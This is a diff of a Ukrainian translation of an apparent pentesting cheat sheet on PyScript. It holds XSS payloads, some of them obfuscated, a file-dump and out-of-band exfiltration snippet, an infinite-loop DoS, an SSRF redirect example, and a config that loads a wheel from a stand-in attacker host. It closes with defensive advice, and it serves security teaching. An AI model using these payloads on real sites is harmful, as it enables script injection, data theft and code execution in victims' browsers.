@@ -1,14 +1,16 @@
 # Pyscript
 
-## Посібник з пентестингу PyScript
+{{#include ../../banners/hacktricks-training.md}}
 
-PyScript — це новий framework, розроблений для інтеграції Python в HTML, щоб його можна було використовувати разом з HTML. У цій шпаргалці ви знайдете інформацію про використання PyScript для цілей пентестингу.
+## Посібник з pentesting PyScript
+
+PyScript — це новий framework, розроблений для інтеграції Python у HTML, тому його можна використовувати разом з HTML. У цій шпаргалці ви знайдете інформацію про використання PyScript для цілей penetration testing.
 
 ### Дамп / отримання файлів із віртуальної файлової системи Emscripten:
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
-Код:
+Code:
 ```html
 <py-script>
 with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
@@ -17,9 +19,9 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 Результат:
 
-![Посібник з pentesting PyScript - Вивантаження / отримання файлів із віртуальної файлової системи пам'яті Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![Посібник з пентестингу PyScript - Дамп / отримання файлів із віртуальної файлової системи пам'яті Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [OOB-викрадення даних із віртуальної файлової системи пам'яті Emscripten (моніторинг консолі)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [OOB-ексфільтрація даних із віртуальної файлової системи пам'яті Emscripten (моніторинг консолі)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
@@ -49,7 +51,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 
 ![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting (Ordinary)
+### Cross Site Scripting (Звичайний)
 
 Code:
 ```python
@@ -59,11 +61,11 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 Результат:
 
-![OOB Data Exfiltration файлової системи віртуальної пам’яті Emscripten (моніторинг консолі) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![OOB Data Exfiltration файлової системи віртуальної пам'яті Emscripten (моніторинг консолі) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
-Код:
+Code:
 ```python
 <py-script>
 sur = "\u0027al";fur = "e";rt = "rt"
@@ -151,9 +153,9 @@ return _0x599c()
 ```
 Результат:
 
-![Міжсайтовий скриптинг (Python Obfuscated) - Міжсайтовий скриптинг (JavaScript Obfuscation): DoS-атака (нескінченний цикл)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (нескінченний цикл)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
-### DoS-атака (нескінченний цикл)
+### DoS attack (нескінченний цикл)
 
 Код:
 ```html
@@ -164,7 +166,7 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 ```
 Результат:
 
-![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (нескінченний цикл):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
@@ -172,7 +174,7 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 
 ### Server-Side Request Forgery через неконтрольовані перенаправлення (CVE-2025-50182)
 
-`urllib3 >= 2.2.0, < 2.5.0` ігнорує параметри запиту `redirect` і `retries` під час використання з браузерним transport Pyodide. Якщо атакувальник може впливати на цільові URL, код може переходити за перенаправленнями між доменами, навіть коли йому вказано вимкнути їх у urllib3, послаблюючи захист від SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` ігнорує параметри запиту `redirect` і `retries`, якщо використовується з браузерним транспортом Pyodide. Якщо зловмисник може впливати на цільові URL, код може переходити за міждоменними перенаправленнями, навіть коли йому вказано `urllib3` вимкнути їх, послаблюючи захист від SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -186,11 +188,11 @@ redirect=False,
 print(r.status, r.url)
 </script>
 ```
-Оновіть `urllib3 >= 2.5.0` для Node.js, але не покладайтеся на urllib3 для вимкнення перенаправлень у браузерах; перевіряйте призначення або використовуйте allow-list перед виконанням запитів.<sup>[[4]](#references)</sup>
+Оновіть `urllib3 >= 2.5.0` для Node.js, але не покладайтеся на urllib3 для вимкнення перенаправлень у браузерах; перевіряйте адресати або використовуйте allow-list перед виконанням запитів.<sup>[[4]](#references)</sup>
 
-### Завантаження довільних пакетів і атаки на ланцюжок постачання
+### Завантаження довільних пакетів і атаки на ланцюг постачання
 
-Конфігурація Pyodide у PyScript приймає довільні URL-адреси wheel у `packages`; якщо зловмисник може змінити або впровадити цю конфігурацію, подальший імпорт може виконати контрольований зловмисником Python у браузері жертви.<sup>[[5]](#references)[[6]](#references)</sup>
+Конфігурація Pyodide у PyScript приймає довільні URL wheel у `packages`; якщо зловмисник може змінити або впровадити цю конфігурацію, наступний import може виконати контрольований зловмисником Python у браузері жертви.<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
@@ -199,12 +201,12 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code at import
 </script>
 ```
-Pyodide може встановлювати pure-Python wheels із довільних URL без WebAssembly-збірки пакета.<sup>[[6]](#references)</sup> Ця конфігурація має контролюватися розробником; використовуйте allow-list точних назв пакетів або URL і перевіряйте дайджести віддалених wheel під час збірки або розгортання.
+Pyodide може встановлювати pure-Python wheels із довільних URL без WebAssembly-збірки пакета.<sup>[[6]](#references)</sup> Ця конфігурація має контролюватися розробником: дозвольте в allow-list лише точні назви пакетів або URL і перевіряйте digests віддалених wheels під час збірки або розгортання.
 
-### Зміни в санітизації виводу (2023+)
+### Зміни санітизації виводу (2023+)
 
-* У реалізації 2022.05.1, що використовується в legacy-прикладах, `print()` записує вивід `text/plain` без HTML-екранування, тому він є вразливим до XSS.<sup>[[8]](#references)</sup>
-* Поточний helper `display()` **екранує HTML за замовчуванням** для звичайних рядків; сирий markup потрібно обгорнути в `pyscript.HTML()`.<sup>[[2]](#references)</sup>
+* У реалізації 2022.05.1, яка використовується в legacy-прикладах, `print()` записує вивід `text/plain` без HTML-екранування, тому він вразливий до XSS.<sup>[[8]](#references)</sup>
+* Поточний helper `display()` **екранує HTML за замовчуванням** для звичайних рядків; необроблену розмітку потрібно обгорнути в `pyscript.HTML()`.<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -212,25 +214,25 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Використовуйте `display()` для ненадійних вхідних даних і не передавайте ненадійні рядки до `HTML()`.<sup>[[2]](#references)</sup>
+Використовуйте `display()` для недовірених даних і не передавайте недовірені рядки до `HTML()`.<sup>[[2]](#references)</sup>
 
 ---
 
-## Найкращі практики захисту
+## Defensive Best Practices
 
-* **Підтримуйте пакети в актуальному стані** – використовуйте `urllib3 >= 2.5.0` у Node.js і окремо перевіряйте припущення щодо перенаправлень браузера.<sup>[[4]](#references)</sup>
-* **Обмежуйте джерела пакетів** – використовуйте allow-list назв PyPI або точних довірених URL-адрес і перевіряйте дайджести віддалених wheel під час збирання або розгортання.<sup>[[5]](#references)[[6]](#references)</sup>
-* **Посильте Content Security Policy** – забороніть вбудований JavaScript (`script-src 'self' 'sha256-…'`), щоб ін'єктовані блоки `<script>` не могли виконуватися.
-* **Забороніть теги `<py-script>` / `<script type="py">`, надані користувачами** – санітизуйте HTML на сервері перед його відображенням іншим користувачам.
-* **Ізолюйте workers** – якщо вам не потрібен синхронний доступ до DOM із workers, увімкніть прапорець `sync_main_only`, щоб уникнути `SharedArrayBuffer` і пов'язаних із ним вимог до заголовків CORS.<sup>[[5]](#references)</sup>
+* **Підтримуйте пакети в актуальному стані** – використовуйте `urllib3 >= 2.5.0` у Node.js і окремо перевіряйте припущення щодо browser redirect.<sup>[[4]](#references)</sup>
+* **Обмежуйте джерела пакетів** – використовуйте allow-list назв PyPI або точних довірених URL і перевіряйте digests віддалених wheel під час build або deployment.<sup>[[5]](#references)[[6]](#references)</sup>
+* **Посильте Content Security Policy** – забороніть inline JavaScript (`script-src 'self' 'sha256-…'`), щоб ін'єктовані блоки `<script>` не могли виконуватися.
+* **Забороніть надані користувачами теги `<py-script>` / `<script type="py">`** – sanitise HTML на сервері перед тим, як повертати його іншим користувачам.
+* **Ізолюйте workers** – якщо вам не потрібен синхронний доступ до DOM із workers, увімкніть прапорець `sync_main_only`, щоб уникнути `SharedArrayBuffer` і пов'язаних із ним вимог до CORS header.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-- [2] [Документація вбудованих функцій PyScript – `display` і `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - Мистецтво побудови ланцюжків вразливостей (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [2] [Документація PyScript Built-ins – `display` і `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - Мистецтво об'єднання вразливостей (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
 - [4] [Рекомендації з безпеки urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
-- [5] [Документація з конфігурації PyScript – пакети та `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [5] [Документація з конфігурації PyScript – packages і `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
 - [6] [Pyodide – Завантаження пакетів](https://pyodide.org/en/stable/usage/loading-packages.html)
 - [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
 - [8] [Реалізація `pyscript.py` у PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
